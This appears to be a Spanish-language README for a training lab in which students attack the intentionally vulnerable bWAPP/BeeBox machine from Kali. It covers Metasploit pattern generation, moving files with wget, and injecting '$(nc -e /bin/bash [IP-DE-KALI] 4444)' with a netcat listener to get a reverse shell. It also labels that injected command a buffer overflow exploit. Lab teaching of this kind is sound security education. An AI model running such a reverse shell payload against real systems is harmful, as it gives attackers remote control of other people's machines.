<!-- hide -->
#  Buffer overflow exploit

> By [@rosinni](https://github.com/rosinni) and [other contributors](https://github.com/breatheco-de/buffer-overflow-exploit-project/graphs/contributors) at [4Geeks Academy](https://4geeksacademy.co/)

[![build by developers](https://img.shields.io/badge/build_by-Developers-blue)](https://4geeks.com)
[![build by developers](https://img.shields.io/twitter/follow/4geeksacademy?style=social&logo=twitter)](https://twitter.com/4geeksacademy)

*Estas instrucciones estan [disponibles en espa침ol](https://github.com/breatheco-de/buffer-overflow-exploit-project/blob/main/README.es.md)*

### Antes de empezar...

> 춰Te necesitamos! Estos ejercicios se crean y mantienen en colaboraci칩n con personas como t칰. Si encuentras alg칰n error o falta de ortograf칤a, contribuye y/o rep칩rtalo.

<!-- endhide -->


<onlyfor saas="true" withBanner="true">

## 游꺔 쮺칩mo empezar este proyecto?

Este ejercicio tiene como objetivo aprender a identificar y explotar vulnerabilidades de buffer overflow. A trav칠s de este proyecto entender치s c칩mo los desbordamientos de buffer pueden ser utilizados para ejecutar c칩digo arbitrario, as칤 como a aplicar t칠cnicas de explotaci칩n para comprometer la seguridad de la aplicaci칩n.

### Requisitos

* M치quina Kali (atacante) 
* M치quina Beebox

</onlyfor>

## 游닇 Instrucciones

1. Verifica que tanto Kali Linux como BeeBox est칠n conectadas en la misma red. Puedes hacer esto comprobando las direcciones IP asignadas a cada m치quina y asegur치ndote de que pueden comunicarse entre s칤.

2. Verifica la conectividad. Desde Kali, intenta hacer ping a BeeBox y viceversa para confirmar que la conexi칩n de red est치 funcionando.

    ```bash
    ping [IP-DE-BEEBOX]
    ping [IP-DE-KALI]
    ```
3. Inicia sesi칩n en la m치quina BeeBox.
4. Encuentra el hash relacionado con la vulnerabilidad (esto puede ser parte de la configuraci칩n o el c칩digo).

### Verificar la Vulnerabilidad de desbordamiento de b칰fer

1. Ingresa un nombre de pel칤cula que est칠 en la base de datos de bWAPP (por ejemplo, Hulk, Iron Man).
2. Luego ingresa un nombre de pel칤cula que no est칠 en la base de datos (por ejemplo, Harry Potter).

3. Ejecuta el siguiente comando para ver el contenido del archivo `bof_1.php`:

    ```bash
    cat /var/www/bWAPP/bof_1.php
    ```

   > El objetivo es entender c칩mo se maneja el input del t칤tulo de la pel칤cula y c칩mo se pasa como argumento de l칤nea de comandos a la aplicaci칩n. Busca indicios de desbordamiento de b칰fer.

### Generar y usar la Cadena de Explotaci칩n
1. Generar la cadena de explotaci칩n ejecutando el siguiente comando en Kali para generar una cadena que te ayudar치 a identificar el desbordamiento de b칰fer:

```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 360
```


2. Guarda la cadena generada en un archivo llamado `pattern_chain.txt`:

```bash
    echo "Aa0Aa1Aa2Aa3Aa4Aa5..." > pattern_chain.txt
```

3. Inicia un servidor HTTP en Kali para transferir el archivo:

```bash
python3 -m http.server 8080
```

4. Descarga el archivo `pattern_chain.txt` en BeeBox usando `wget`:

```bash
wget http://[IP-DE-KALI]:8080/pattern_chain.txt
```

5. Lee el contenido del archivo descargado en BeeBox:
```bash
cat pattern_chain.txt
```

### Inyectar la cadena de explotaci칩n y el payload

1. Usa la cadena generada con `pattern_create.rb` en el campo o par치metro que pueda causar el desbordamiento de b칰fer en bWAPP.

![imagen 1](assets/bufferoverflow.png)

> El objetivo seria ver c칩mo responde la aplicaci칩n a una entrada que excede el tama침o esperado.

2. Ejecuta un listener en Kali para recibir la shell remota:
```bash
nc -lvnp 4444
```

3. Para obtener una shell remota, inyecta el siguiente payload en el campo que causa el desbordamiento:

```bash
    $(nc -e /bin/bash [IP-DE-KALI] 4444)
```

> Reemplaza `[IP-DE-KALI]` con la direcci칩n IP de tu m치quina Kali.

4. Confirmar la conexi칩n en Kali. Si el exploit es exitoso, deber칤as ver una conexi칩n en el listener de Kali y recibir un prompt de Bash.

### Verificar los Logs del Servidor

1. Revisa los logs del servidor web en BeeBox para cualquier mensaje relacionado con el desbordamiento de b칰fer:

```bash
sudo cat /var/log/apache2/error.log
```

![imagen 1](assets/segmentationfault.png)
